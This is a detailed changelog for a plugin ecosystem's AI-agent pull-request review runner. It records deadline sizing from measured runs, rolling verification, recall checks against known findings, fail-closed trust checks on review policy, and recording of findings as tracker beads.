# Changelog

All notable changes to the Ensemble Plugins ecosystem will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added

- **packages/development:** `review-run` gives a small slice the time the first live runs showed it needs, and no longer waits for a whole verify wave (kata `d9sy` and `630v`, epic `ptqb`, from the first real model-agent measurements, kata `q3a9`). **Deadline floor (d9sy):** a High first review lost a reviewer at its 15-minute deadline on 4 paths and 280 lines and reported the slice not reviewed. The run files show no delay at the spawn call (10 to 11 ms after the manifest, one wave under a cap of 8, and the deadline starts at dispatch; the agent's own start is not recorded) and no size effect: at effort `hi` reviewers took 14.6 and 9.1 minutes on 77 lines, 10.6 and 9.4 on 327, 8.2 and 10.6 on 323, 12.8 and over 15 on the 280-line slice, and 7.2 and 7.3 for two other reviewers of the same four paths in a re-review. Why the lost reviewer was lost is not established (no arrival, no last message: slow cannot be told from hung). The size model has no fixed cost, so the 15-minute base decided with 0.4 minutes of margin over the slowest finished reviewer. A reviewer, the whole-range reader and the security lane now have a floor `MIN_AGENT_MINUTES` of 22 minutes (the slowest finished reviewer, 14.58, times 1.5, a judgement), whatever the policy's `deadlineMinutes` says; the slice limits and the headroom are unchanged. A policy `deadlineMinutes` below 22 is overridden and the run's sizing says so (`deadline-floor-over-policy`). A reviewer slower than 22 minutes is still `expired` and its slice reported not reviewed; re-dispatching a lost reviewer is not built. **Rolling verification (630v):** a Medium review of PR 207 took 26.8 minutes: 14.6 for the slowest reviewer, then three barrier verify waves of 4.5, 5.0 and 1.9 minutes (17 verifiers at a cap of 8, 49.3 agent-minutes of work), each wave lasting as long as its slowest verifier. A `collect` that finds verifiers still running and slots free now dispatches the next verifiers of the unchanged plan into them (`DISPATCH` with `refill: true` and `stillRunning`; the cap counts both, a refill is at least a quarter of the cap, each deadline starts at that agent's dispatch, the run is collected only when every agent has arrived or expired; an expired verifier frees its slot). Every candidate keeps its K distinct verifiers, none a reviewer or its raiser. `pr-review-cli timing` reads the overlapping verifier waves as one step (`rolling: true`) only when every overlapping wave is marked with its cap facts and the trace bears them out; otherwise the overlap is refused as before and a warning says why. Replayed through the real runner on the measured verifier times (a checked-in test): barrier 11.4 to 11.5 minutes (measured 11.7), rolling 7.3 to 7.8, 3.8 to 4.1 minutes saved, about 22.9 of the 26.8 for the run. The 8 to 13 minute target is NOT met by this: the slowest reviewer alone took 14.6 minutes.
- **packages/development:** the quality guard failed the first real Medium run and the false negatives were traced to their causes (kata `yg7k`, epic `ptqb`). PR 207's run (7 reviewers, 17 verifiers) found 1 of the 6 Important findings an earlier review had confirmed on that head: 4 were never raised, 1 was raised only as a Nit. The run files show where each was lost: no candidate was voted not-real (14 of 17 got three real votes, three got two because a verifier expired) and nothing was unbriefable, so the loss is at the reviewers. (1) The reviewer contract named `important` and `nit` and defined neither, and three reviewers graded as `nit` a defect that makes a generated file not compile; every agent the runner dispatches that writes findings (the slice reviewers, the whole-range reader and the security lane) now gets the Severity bullets of `REVIEW.md` read at the base commit and nothing else (a built-in copy, pinned equal to the file, applies when the base has none, and a Severity section that cannot be read is named as `severity-guide-fallback` in the manifest warnings, not replaced in silence); the narrated `brief` call returns the bare template as before. (2) The reviewer and whole-range briefs allowed ONE throwaway snippet and 40 tool calls, and findings that needed running the code were not raised (the cause is an inference); both numbers now come from the policy (`reviewerToolCalls`, default 40, 10-200; `reviewerSnippets`, default 3, a judgement, 1-10 and below the call cap, which snippets count toward; advisory, since deadlines are sized from paths and lines only, and an incomplete coverage stops the gate), are stated in the brief as `Tool calls` and `Throwaway snippets`, and the brief says to spend snippets on a claim about what the code does. Verifier briefs, vote rules and every hard constraint are unchanged. New `lib/review-recall-guard.js` scores a run's findings against a reference set of known Important findings (`docs/review-eval/recall/`, with the PR 207 set and the run's committed ledger) and reports `found` / `downgraded` / `not-raised` and a false-negative rate (exit 1 above `--max-false-negative`, default 0; exit 2 on unreadable input); matching is by wording and place, not understanding. What code cannot fix is written down in `docs/review-eval/recall/README.md`: whether a reviewer thinks to probe a path is the model's depth, bought only with the policy knobs above (and the dispatcher's effort), at the cost of wall time and tokens; nothing here is proven to recover the four unraised findings until the re-measurement.
- **packages/development:** an untrusted review policy no longer LOWERS a PR's tier (kata `vhpf`, epic `ptqb`). `review-run` reads `REVIEW.md` at the merge base; a block with a stale or foreign `sourceSha` (`policy-not-from-base`), an unparseable one or any other `ok:false` policy fell back to strict defaults, which carry no `highPaths`, so a PR changing `packages/development/lib/**` on a stale branch was classified Medium (light mode) where current `dev` says High. `prepare` now fails up: when the policy is not usable every changed path is High, named `policy-untrusted:<reason>` in `facts.paths`, in the tier's `reasons` and as `policyStatus` in the run state (warning `policy-untrusted-all-high:<reason>`), until the PR is based on a trusted policy. A policy supplied by the PR itself is still never read; no policy file at all stays the documented defaults. Sensitive paths: `pr-review-paths.js`, `pr-review-prepare.js`.
- **packages/development:** `review-precheck` reports the real reason the local-CI gate did not start (kata `zy6j`, epic `ptqb`). Before, every failure of `readGateConfig` (a missing `js-yaml` in a checkout without `node_modules`, an unparseable file, an unreadable blob) was reported as `no readable .ensemble/local-ci.yaml at the base ref`. The answer now carries `missing-file`, `unreadable-file`, `parse-error`, `invalid-config`, `missing-dependency` (naming the module and `npm install`), `validation-failed` or `config-reader-failed` with the underlying text; the gate still does not start (fail closed). Sensitive path: `review-precheck-cli.js`.
- **packages/development:** `review-run` sizes its slices and deadlines to what there is to read (kata `sfpb`, epic `ptqb`). The first real full-mode run (PR 271: 19 paths, 1450 changed lines, one `whole-pr` slice under the 1500-line threshold, a flat 15 minutes for every agent) had its security lane arrive 2m45s after its deadline, so it was recorded `expired`, and one of its two reviewers listed 5 of the 19 paths, so the slice was reported not reviewed. The runner failed closed, correctly: the plan was what was wrong. New lib `lib/pr-review-sizing.js` (vendored) holds that run's own record (the `run.json` timings and each agent's `pathsReviewed`) and derives the rates and the slice limits from it: the slowest agent that read every path gives 0.934 minutes per path and 1.224 per 100 changed lines, and the slice limits are the same model solved for the slice that just fits the 15-minute reviewer deadline with its headroom: 8 paths and 612 changed lines. The headroom, 2, is a judgement and not a measurement: the run holds one observation of each agent, so no ratio in it is the spread of one agent's time on identical work; 2 is set above 1.18 (the lane's overrun) and 1.70 (two reviewers that did not do the same work) and below 2.26 (the lane over the reviewer that read the same paths), and at 2.5 the real PR would need four slices and a 45-minute lane. Three new policy keys, `sliceMaxFiles` (8), `sliceTargetLines` (612) and `deadlineHeadroom` (2), are validated by name. `deadlineMinutes` is now the BASE of a reviewer's and the lane's deadline (an explicit value cannot be told from the default, so it is a floor and not a pin): `reviewDeadlines` takes `work: {files, lines}` and raises the base to the modelled time to read it, with headroom, at most 60 minutes (a need over that is capped and said), and never lowers it; `planSlices` takes `maxFiles`, which closes a slice once it holds that many paths. The runner now cuts every PR by size at every size (`sliceThreshold` only names the one slice, and `REVIEW.md` says so), into no more slices than let the whole review round and the lane run in one wave at `maxConcurrentAgents`, hands each reviewer a diff of its own slice (`slices/slice-<n>.diff` in the run directory, or the whole range diff when its paths cannot all be placed in it) and records the plan in `run.json` and the DISPATCH manifest: `sizing` (model, limits, slices and `warnings`: `slice-over-limit`, `deadline-capped`, `invalid-<key>`, which now also names a sizing key the policy loader rejected) and each agent's `deadlineMinutes` and `work`. The PR the numbers came from is now three slices of 8, 3 and 8 paths, reviewers at 15 minutes and the lane at 36 (2x what it took). Nothing is relaxed: a result after its (larger) deadline is still `expired`, and a reviewer that lists fewer paths than its slice still leaves the slice not reviewed. Honest limits: the model is one observed run; it cannot make a reviewer reach every path (reviewer-s1-b stopped 10.4 minutes inside its deadline having listed 5 paths), and whether reviewers now reach every path on a live run is not measured, so the 15-minute defect is addressed, not shown fixed; a reviewer reads its slice's diff, not the PR's, so an interaction between slices is read as a whole only by the security lane and, in full mode, by `TRIAGE` (a Medium PR in light mode has no `TRIAGE`: the final answer says so in `reducedReview`, which now also carries the plan's warnings, and the `TRIAGE` answer carries `rangeDiff` and `slices`); the lane is one agent, so its deadline is capped at 60 minutes above about 32 paths or 2,450 changed lines.
- **packages/development:** a light-mode `review-run` cut into several slices gets one whole-range reader when the cap holds it (kata `sfpb`, review rounds 2 and 3 of PR 274, an owner decision). A reviewer reads only its slice's diff and a light run has no `TRIAGE` step, so a Medium PR above the slice limits had no non-security reader of the whole diff. The runner now adds ONE `reviewer-range` (slice id `whole-range`) to a light run cut into several slices: the first lens, every changed path, the whole range diff and a brief of its own (role `range-reviewer`, `templates/range-reviewer-brief.md`: it says it reads the whole range and to look first for a defect that spans slices, and keeps the reviewer's rules word for word), in the same wave, with a deadline the size model sizes for the whole diff (36 minutes for the real PR). The slices come first (`floor((maxConcurrentAgents - lane) / lenses)`: 3 at the default cap) and the reader is planned only when the cap holds it beside them (`slices x lenses + lane + 1 <= maxConcurrentAgents`: 3 x 2 + the reader + the lane = 8 at the default cap); a slice that fits the limits is never given up for it, and a plan that leaves it out says so (`reader-not-planned`, naming the cap that would hold it). It is graded like any reviewer: a result after its deadline is `expired` and a list of fewer paths is `paths-not-reviewed`, and either leaves `whole-range` in `notReviewed.unreviewedSlices` (`NOT REVIEWED: whole-range read`) and the coverage incomplete (the slices' own coverage stands, and the reader never counts as a pass of a slice's lens); its findings go through the same verification. The `cross-slice` line and the reader-failure line of `reducedReview` name only what actually read the whole diff (a security lane that did not arrive and cover every path, or a reader that failed, is not credited, and `by no agent` is said when none did) and count only the slices that were really cut. A slice reviewer handed the WHOLE range diff (its paths could not be placed in it) is now sized for the whole diff too, and `slice-over-limit` no longer names a reader the plan does not contain. Not done: a full run has no such reader (its `TRIAGE` step is handed the whole range), and the reader's reach of every path on a live run is not measured.
- **packages/development, packages/git:** the merge sweep records what it finds (kata `mdfr`, epic `ptqb`, plan `docs/plans/pr-review-speedup-plan.md` section 3H and section 7 correction 2). Before, `local-ci-cli.js sweep` only diffed already-fetched facts against a caller-supplied `trackedKeys`: nothing built that set from the tracker and nothing created a bead (`pr-merge.yaml` held one line of prose telling the model to do it through `br`). Now `sweep {facts, repoRoot, repo, pr, headSha, baseSha, dryRun?}` (`lib/local-ci-sweep-record.js`; payload, facts and answers in `skills/local-ci-gate/SWEEP.md`) lists the tracker once (`findByKeys`: a bead holding the key counts whatever its state or labels), names what is new with `findUntracked` and creates one bead per new entry under its sweep key (`finding:pr<N>:comment<ID>` or `ci-failure:checkrun<ID>`; labelled `merge-sweep` and `bot-finding` (task, priority 2) or `ci-failure` (bug, priority 1)), so a second sweep of the same facts writes nothing. A bead a person closed is never recreated or reopened, a key held twice is an error for that key, and the sweep never updates, relabels or closes a bead. It answers `RECORDED`, `PLANNED` (`dryRun`), `UNAVAILABLE` (no tracker or capability: skip the beads), `REFUSED`, `PARTIAL` (a create failed, a key is held twice or an entry has no readable id: exit 1) or `FAILED`. It writes only where the PR-review recorder writes, under that recorder's own trust checks (`pr-review-beads-cli.js` `checkTrust`, reused unchanged): the host is asked about `repo` and `pr` (a fork head, an unreadable PR, a head that is not the PR's and a base that is not on its base branch are refused by name), the tracker runs in the primary checkout (one that holds the head is refused) with the tracker choice read from `.ensemble/toolchain.yaml` as committed at `baseSha` and `untrustedProjectRoot: true`, and `repoRoot` is required. `trackedKeys` is no longer accepted (rejected like any unknown key: a set the caller supplies could only hide a finding), and with nothing to record git, the host and the tracker are not asked. `/ensemble:pr-merge` 2.4.1 points both sweeps at that contract and passes `dryRun` under `--dry-run`. Not changed: collecting the facts stays the caller's job (the host adapter's normalized thread output carries no comment id), and the plan's section 7 correction 2 still describes the old state until its own change (kata `wj1a`).
- **packages/development:** `pr-review-cli.js walltime`, review wall time by tier with a before/after compare (kata `vrda`, epic `ptqb`, plan section 5 second bullet). A new pure `lib/pr-review-walltime.js` reads a cohort document of review runs (tier, round, wall minutes, review chains, gate runs, origin; a `schema` key is required) and answers per (tier, round) stratum the runs, distinct PRs, median and nearest-rank p75, per tier the gate runs and review chains per PR, and, for a baseline against a post-change cohort, `met`, `not-met` or `unknown` per stratum. A stratum with fewer than three PRs with a wall time on either side is `unknown`, never `met`; `met` needs the median AND the p75 at a fifth of the baseline's, judged on the unrounded values; stand-in and fixture rows, and a real row with a wall time under one minute, are listed under `excluded` and never counted; a figure that was not recorded is `null` with a reason. `fiveX.claim` is `met` only when every required stratum (`medium/first`, `high/first`, `high/re-review`) is met AND the current cohort holds a real HIGH-tier re-review (a run of the `high/re-review` stratum itself) in which verdicts were carried across heads (plan section 5: do not claim 5x until PR 4 has run on a real re-review) AND, through `walltime compare`, every counted current row of a required stratum agrees with the trace its `run_id` names (wall time, chains, gate runs); otherwise `unknown`, or `not-met` when a stratum is measured and misses. `origin`, the tier and the carried-verdict evidence stay attested by the row's writer (nothing signs a row, a state report is an untracked file) and the answer says so on every `met` (`fiveX.attestation`, a `claim-met-attested` warning). Actions: `summarize`, `row` (one row from a `timing` answer or a trace on disk, with carry evidence from the PR's state report) and `compare` (optional `cwd` for the traces); a payload key an action does not know is an error. The committed `docs/guides/review-walltime-baseline-2026-11-07.json` holds the plan's section 1 runs (#225, #228, #229 and #233: six runs on four PRs), each figure traced to its plan cell (a test checks it) and to the omp session it was measured from (re-read 2026-11-07, the end point of each interval stated per row; those files are not in the repository). It records what the data cannot support: only `high/first` has three PRs (`medium/first` and `high/re-review` have one each, so a compare against them is `unknown`), #228 and #229 were high tier by the CLI (the plan labels no PR's tier; its section 2 medium band of 40 to 65 min matches their times), and #233's fourth chain was aborted and has no wall time. Guide: `docs/guides/pr-review-walltime.md`.
- **packages/development:** a review candidate the verifier brief refuses now ends in a named state instead of a silent one (kata `0g9n`, epic `ptqb`; the one real full-mode run, PR 271, had 2 of 5 candidates refused). The verifier brief refuses, by design, a claim that names the orchestrator or a verdict, an over-long claim and a path with whitespace, and reviewers of review infrastructure write those words about the code; such a candidate used to be kept unverified with K phantom verifier slots, the reason `verifier-incomplete` and a tally the operator's list printed as `0 of 5`. Now `renderBrief` throws a `BriefRefusal` that names the input and a `kind` (`leak`, `claim`, `location`, `path`, `other`); the verify round plans only the candidates a verifier can be briefed with (each still gets K distinct verifiers); the refused candidate is kept as written with `verification: unverified`, the reason `unbriefable`, no tally and no assignment; `votes.verification` is `partial` (`not-performed` when every candidate is refused or none of the others was verified) with the reason `unbriefable-candidates`, which is what tells these two values apart from the per-finding degradation `tallyVotes` reports; the reduced-review notice, `notReviewed.unbriefable` and the operator's `dispositionChoices[].verification` (with `votes: null`; read from the ledger finding's own record when the list is built from the recorded state with no `votes`, the `MODE=gate` path) name it, and the gate reads it like any other finding. The reviewers' output contract now states the refused words, the claim length cap and the path grammar (taken from the renderer's own table and tested to agree; the security lane's contract is unchanged). In full mode the `TRIAGE` answer marks each refused candidate and the orchestrator may ADD a restatement the brief accepts: triage deduplicates only against candidates a verifier will be asked about, so the restatement is kept and verified by its own verifiers and the refused candidate stays as written. The screen is NOT relaxed and no word is rewritten (no rewrite is both leak-proof and meaning-preserving, and a re-run of the reviewer has no context left): a person decides a refused candidate. Limits: a light run has no `TRIAGE`, so no restatement; when two reviewers raise one defect the dedupe can keep the entry whose wording is refused; the contract is an instruction, not an enforcement. One test that pinned the old unbriefable record shape (`{id, reason}`) now pins `{id, kind, input, reason}`. Guide `docs/guides/pr-review-run.md`, references `review-run.md` and `merge-gate.md` updated. Touches sensitive paths (`lib/pr-review-*`, the `pr-review-cycle` skill): an owner override is needed on merge.
- **packages/development:** review-run full mode (kata `dqcs`, epic `ptqb`, plan section 3G): a High tier, a sensitive or High path, an unreadable tier or any ambiguity now runs in the same runner instead of answering `NEEDS_FULL_MODE`. A raised tier selects full mode too (`selectMode`), but the runner cannot produce one today (`prepareRun` passes `assignTier` no second assessment and no proposed tier), so that case is exercised only with an injected tier record. Full mode is Deep depth always (at least 2 reviewers per slice, 5 verifiers per finding, whatever the tier word says), the security lane always, a model-orchestrator `TRIAGE` stop between the review round and the verify round (the orchestrator may only ADD candidates, via the `triage` payload of `collect`; they go through the same independent verifiers; nothing can remove, re-grade or close a candidate; an entry the verifier brief would refuse, such as a claim that names the orchestrator or a verdict or a path with whitespace, is refused at triage as `triage-refused`, naming why), and a recorded re-review scope rule (`reReview`: delta only when no High or sensitive path is touched and the CLI has seen the previous head, else a full re-read; only a record today, because the run still has reviewers read the whole range until verdict carry-over lands). The mode comes only from `selectMode`; every `collect` refuses a stored run whose mode label is not `selectMode`'s answer for the tier it stores, and a full run below Deep, five verifiers or the lane (`mode-invariant`), and no payload key can pick a mode. `NEEDS_FULL_MODE` remains only for a light run whose brief the renderer refuses; a full run whose brief the renderer refuses is `RUN_FAILED` `brief-refused`, and its answer states the decision (never lowered to light, no review and no verdict) and the operator's way forward (`decision`, `fallback`). The High-tier saving is unmeasured: the run records wall time, orchestrator turns and `triageCalls` and makes no 5x claim. Defects of the first real full-mode run that this change does not fix are tracked on their own: the 15-minute lane deadline (`sfpb`), reviewer claims the verifier brief refuses (`0g9n`) and `peekRun` (`yz76`). New lib `lib/pr-review-full.js` (vendored).
- **packages/development:** `review-run` emits the stage-span contract `pr-review-cli timing` reads (kata `k0sh`, epic `ptqb`). Before, the runner wrote `precheck`, `prepare-head`, `agent:<name>` and `gate`, none of which the reader knows, so `timing` on a real review-run trace answered `ok:false`. Now one `review` root per run (opened by `prepare`, closed by the call that ends the run), `review.head-read`, `review.gate`, `review.verdict` and one `review.<role>` span per dispatched agent with its `agent` name, a numeric `round`, its `wave` and `last_message_ts` (the arrival of its result file), so an agent counts to its last message and not to the `collect` call; the old names are no longer written. Names and kinds are imported from `lib/pr-review-timing.js`; `run-trace.js` is unchanged. Review of PR 270, round 1: the reader's critical path now takes the slowest reviewer of each wave and the slowest verifier of each wave and sums them (a round with more agents than `maxConcurrentAgents` runs in several waves, one after another, and the one slowest reviewer across them was shorter than the chain); and a result file dated well after the `collect` that read it is recorded as it is and warned about instead of silently counted to the call. Round 2: the security lane is no step of that chain, so a lane that ended after the slowest reviewer of its wave (the usual case at the default cap) or ran in a wave no reviewer ran in is now named in the round (`outlasted`, `uncountedWaves`) and makes its total a lower bound instead of being dropped silently; spans that carry one wave number but started more than 5 s apart are not one wave (that step is missing, not a shorter chain); a verdict span that ended in error is a verdict that was not recorded, so a `collect` retried after a failed state write or a throw leaves one verdict in the window instead of two, which left the critical path missing (the runner ends the failed attempt's span in error, and nothing in the run file decides it); a finished run records the end of its root in the same write as its verdict, so that write cannot turn a finished review into a failure; and a result file dated before its agent was dispatched gets no `last_message_ts`. Also from round 2: a step that overshoots the window by a millisecond or less (the verdict, which ends an instant before the root) is the rounding of the stamps, which are whole milliseconds, and is no longer reported as a cut and a lower bound (2 of 35 runs of the real CLI did). A committed end-to-end test runs prepare and collect through the real CLI and reads the trace with `pr-review-cli timing`. Not recorded: `turns` and `tool_calls` (the runner cannot see the model).
- **packages/development:** `review-run-cli.js`, review of PR 264 round 3 (kata `znd1`): the check that a reviewer's `pre-existing` citation names a file at the head no longer follows links or trusts the host's path rules. Each segment of the cited path must match a directory entry exactly (a mis-cased name names no file on a case-insensitive volume either), a symlink, directory, FIFO or device is not a file of the head, only a regular file is opened (a final link is not followed and a FIFO is not waited on, so a link a PR adds to one can no longer block `collect`), and a citation whose line is past the end of the file is graded Important. `pr-review-cycle` `SKILL.md` has dev's owner paragraph and its `before running it` clause back and the light-mode pointer its words; Step 9's explanation of the state report, which `reference/status-and-state.md` holds in full, is cut to one sentence to make room without raising the word baseline. The guide and the reference now say that a finding labelled `nit` does not block the gate (owner decision, unchanged).
- **packages/development:** `review-run-cli.js`, review of PR 264 round 2 (kata `znd1`): a reviewer's `pre-existing` severity now also needs the cited path to be a file that exists at the head (a truncated, `a/`-prefixed, relative-snapshot or invented spelling of a changed file is graded Important instead of removing its blocker); the cross-repository head refusal is tested under `skipPrecheck` and `dryRun`; and `prepare` refuses a PR that was closed while the baseline ran (`pr-not-open`) at its second head read. Not changed, owner decisions: the shared gate's `nit` exemption lets an unverified `nit` label remove a blocker, and the stored answer of a finished run is as of its finalise.
- **packages/development:** light-mode review runner (`lib/review-run-cli.js` with `prepare` and `collect`, kata `znd1`, guide `docs/guides/pr-review-run.md`, skill reference `skills/pr-review-cycle/reference/review-run.md`). For Low and Medium tier PRs the `pr-review-cycle` skill now drives the review through the runner: the model starts the agents the manifest names (prompts unedited, concurrency cap and deadlines respected by the dispatcher), calls `collect` until `DONE` or `ADJUDICATE`, and decides only the listed items. `NEEDS_FULL_MODE` keeps the narrated Steps 1-10 as the unchanged fallback, and `/ensemble-pr-merge` still reaches the gate only through the skill. No speedup is claimed here. The runner fails closed on what it was reviewed for: it refuses, by name and before anything is fetched, run or posted, a head on a fork or whose repository GitHub did not state (`cross-repository-head`, `head-repository-unknown`) and a PR that is not OPEN (`pr-not-open`); a stated `baseSha` is accepted only when it is the merge base (`base-not-merge-base`); a finished run re-reads the head before it returns its stored answer, so a head that moved is `RUN_INVALIDATED` and never replays a stale `mergeable`; a reviewer's `pre-existing` severity stands only when the diff bears it out and is graded Important on a changed line (the agent's word kept as `claimedSeverity`); `metrics.orchestratorTurns` records the model turns the protocol itself requires, as a lower bound; and a caller-stated `agentAuthored` is named in the answer's `warnings`. Trace spans join a `/ensemble-pr-merge` run's trace only when the caller passes that run's id as `traceRunId`. The comparison against the narrated flow on real PRs has not been run.
- **packages/development:** the merge gate records every presented PR-review finding as a bead (kata `n350`, plan `docs/plans/pr-review-speedup-plan.md` section 3H item 1, acceptance test (b)): `MODE=gate` in full mode only (Step 10 of `reference/merge-gate.md`); `MODE=local`, `MODE=remote` and the light-mode runner (`lib/review-run-cli.js`) do not call the recorder. `lib/pr-review-beads.js` (pure) plans one `create | update | close | skip` per finding from the beads the tracker already holds, keyed by repository + file + normalized claim (the ledger's own claim normalization; not the line, head or PR): a reworded claim is another key and so a second bead (a stated limit), a later head rewrites the bead and appends one note and the same head again writes nothing, a finding cleared at a later head closes its bead only when git says `clearedBy` is a commit on the PR, a bead the recorder closed as a fix reopens when the finding comes back and a bead a person closed is reported as closed, more Nits (or Pre-existing) than the collapse threshold in one file become one bead (counted over findings with no bead yet; a one-member bead is never created, though a sticky bucket can come to hold one member), and `follow-on` is added only for the findings the operator named. `lib/pr-review-clear-cli.js` derives the `cleared` marks from the git diff since the prior round's reviewed head. `lib/pr-review-beads-cli.js` (`node pr-review-beads-cli.js < payload.json`; `repoRoot` and `baseSha` required) asks the host about the PR first and refuses a fork head, an unknown head repository and an unreadable PR, runs the tracker in the primary checkout (refusing one that holds the head) with the tracker choice read from `.ensemble/toolchain.yaml` at the base, and answers `RECORDED`, `PLANNED` (`dryRun`), `UNAVAILABLE` (no tracker or capability: skip the beads, still show the list), `REFUSED`, `PARTIAL` or `FAILED`. Recorded text is redacted (AWS key ids, `github_pat_` tokens, PEM keys, `name=value` secrets). It only records: it never edits a file, writes a `resolution`, or spawns a fix, so it behaves the same under `--foreman`. `tracker-findings.js` gains `findByKeys`, `labelFinding`, `reopenFinding` and `createToolchainDeps({ untrustedProjectRoot, baseConfig })`: the reviewed tree never supplies the adapter or the tracker choice that records its own findings; `ledger` exports `fingerprintPath` and `normalizeFailureMode`, `disposition` exports `isSecurity`. The "not implemented yet" notes in `reference/merge-gate.md` and the user guide are replaced by the calls, their refusals and their limits. The post-merge sweep recording in `pr-merge.yaml` is not part of this change.
- **packages/development:** second review of the PR-review bead recorder and clear verb (kata `n350`). `lib/pr-review-clear-cli.js` now requires `incoming` (a call without it fails and clears nothing: an omitted list read every re-raised finding as fixed), carries each cited line through every round's `git diff` hunks (`locationAsOf` stamp, `location-current`, `location-unanchored`, `file:N-M` ranges) so a fix made after an earlier edit above the line is found and an unrelated edit at the old number no longer clears it, and treats a mode-only change as touching no line; its git child no longer inherits `GIT_DIR` and the other repository-binding variables. `lib/pr-review-beads-cli.js` refuses, before any tracker call, a `headSha` that is not the head the host reports (`head-not-pr-head`, `head-unverified`) and a `baseSha` that is not on the host's base branch (`base-not-on-base-branch`, `base-unverified`, `base-tip-unavailable`); a bead is closed only by the pull request that last recorded it (`recorded-by-other-pr`, `recorded-pr-unknown`) and a one-member sticky bucket reads `1 Nit finding`. `redact` no longer rewrites ordinary text (a PEM only through its END line; `Bearer`, `Authorization:` and `name = value` need a credential-shaped value). Stated limits: a hand-written `cleared` mark that names a commit on the PR still closes a bead, and a person who pastes a close reason in the recorder's own shape gets the bead reopened. The light-mode runner still does not call the recorder.
- **packages/development:** third review of the PR-review bead recorder and clear verb (kata `n350`). `lib/pr-review-clear-cli.js` keeps, as `location-unanchored`, an entry that was raised at a head a force-push replaced (its line was judged against another baseline and could clear a defect that is still there) and an entry whose cited file git's rename detection says was renamed (a rename read as a deletion cleared a defect that had only moved); a rename lookup git cannot answer keeps the entry as `diff-failed`. A round the verb was not run at is not read as a fix either: an entry stamped at a head older than `lastReviewedSha` is moved through that round's edits first and kept as `location-unanchored` when one of them touched its line (it used to be compared from the stamp and cleared). `redact` redacts `Authorization:` under any single-word scheme followed by a credential of 8+ token characters (`Api-Key` was missed); an unquoted `name=value` secret that is only letters stays a stated limit. The user guide and this changelog now say that only the merge gate records beads, in full mode, and the "records no beads until kata `n350` lands" sentence is gone.
- **packages/development:** fourth review of the PR-review bead recorder and clear verb (kata `n350`); it edits code of the merged carry change (kata `qw98`). `carry reconcile` (`lib/pr-review-cli.js`) writes no `cleared` mark any more: in the documented delta-round order it ran before the clear verb and marked defects that were still present as fixed (a line shifted across a skipped round, a force-pushed head, a partial fix raised again and voted present), after which the verb reported `already-cleared`, the gate skipped the finding and the bead recorder closed its bead. It answers the ledger read into the current taxonomy and `cleared: []`, its four request keys are still required and are not read, and `clearFixedFindings` itself is unchanged, so `lib/pr-review-clear-cli.js` is the only writer of `cleared` again. The verb also clears nothing when `lastReviewedSha` is not on the PR, stamped entries included (a stamp on the PR and a `lastReviewedSha` off it cleared a touched defect), and `incoming` is documented as every finding the round presented, whatever its verdict. The skill reference, the user guide, `docs/guides/pr-review-carry.md` and `reference/merge-gate.md` say one writer.
- **packages/development:** the PR review never fixes (kata `sp4w`, plan `docs/plans/pr-review-speedup-plan.md` section 3H items 2 and 6). `pr-review-cycle` `MODE=local` of a PR, `MODE=remote` and `MODE=gate` edit no tracked file (they write only the gitignored state report), commit nothing and push nothing; Step 5 (the batch fix) is a separate step that runs only on the operator's `FIX_SELECTION` (a `MODE=local` fix run: one fix agent, one push, then the caller re-runs `MODE=local` for the new head and `MODE=gate`), or on a pre-publication snapshot of the author's own unpublished work. A Fix on this PR answer is never recorded with `ledger resolve` (the gate reads any resolution with provenance as closed, so it would pass the finding with no fix); `--foreman` logs and never fixes, waives no blocking finding and leaves the gate `mergeable:false`. `/ensemble:pr-merge` follows the rule since kata `6k8d` (next entry). Recording findings as beads is kata `n350` (the entries above). Prose and tests only: no CLI or lib change.
- **packages/git:** `/ensemble:pr-merge` 2.4.0 asks about the review findings before the merge-confirmation question (kata `6k8d`, plan `docs/plans/pr-review-speedup-plan.md` section 3H items 2, 5 and 7). After the gate, on every path that reaches the merge (including the one that skips remediation), it prints the gate's numbered decision list (blocking Important and security findings, then Nits, then Pre-existing), asks the operator's own login, then ONE multi-select `AskUserQuestion` per group (a selection is Fix on this PR; a collapsed `file:` entry is offered as its members, because a fix run refuses an id the ledger lacks); every other finding is accepted (a reason typed for each blocking or security finding) or, for a non-blocking finding only, sent to a follow-on PR, through `ledger resolve`, the gate is re-run to read those decisions, and the merge summary (open beads, accepted blocking findings and why) is printed before the merge-confirmation question, which carries it too. Fix on this PR runs ONE `pr-review-cycle` `MODE=local` fix run (one fix agent, one push), then a delta re-review (`MODE=local`) of the new head, then the gate and the list again: one round against the round cap. `--dry-run` prints the list and stops: no question, no `ledger resolve`, no fix run. A review-cycle finding is no longer fixed automatically (only check failures and unresolved human review threads are remediated automatically); only the operator's Fix on this PR selection fixes one, and no rule forbids that path. `--foreman` logs the list and asks, decides, fixes and waives nothing, so a blocking finding keeps the gate refusing (`halted_reason: findings-need-operator`); it records no beads, because recording findings as beads awaits kata `n350` (the "beads are created" half of kata `6k8d` AC2 is deferred to it). The procedure is in `pr-review-cycle` `reference/merge-gate.md`; the command carries only the invariants, and it fits the 2500-word command ceiling without a baseline entry (the text that no runtime renders, `mission.boundaries` and most of `expectedInput`, and wording the steps repeat were cut to make room).

- **packages/development:** delta re-review plan (`lib/pr-review-delta.js` `planDeltaReview`, `lib/pr-review-import-graph.js`, kata `801a`, plan section 3B). `pr-review-prepare` now writes `facts.json` `deltaPlan`: for a vouched delta, the delta plus its blast radius -- the files that reference a changed file by a quoted relative path (`require`, `require.resolve`, `jest.requireActual`, `import()`, a worker path, an HTML `<script src>`), the tests that reference it or carry its name (a jest snapshot reaches the test that owns it), and the files whose `require`/`import()` specifier is computed, interpolated or on the next line when their own text names a changed file (an over-approximation by name, not a silent drop), found by `git grep` scans of the head tree anchored at the repository top; `full` with every applicable reason when the review state does not record the last reviewed head as reviewed by a completed round (the payload's `reviewedHeadSha` is missing or is not `lastReviewedSha`; a commit the repository merely holds does not count), when the base resolved now is not the base that round reviewed against (`reviewedBaseSha` missing or different: a retargeted PR), the delta touches a High or sensitive path or a review declaration file, changes no path, changes a file it can read neither as JS/TS the graph analyzes nor as documentation, data or an asset (an allowlist: a type nobody listed fails closed), or an input is unreadable. A `full` range from `review-range` is never overridden to a delta. The graph is file level; its limits are listed in `docs/guides/pr-review-prepare.md`. `SCHEMA_VERSION` is now 3.
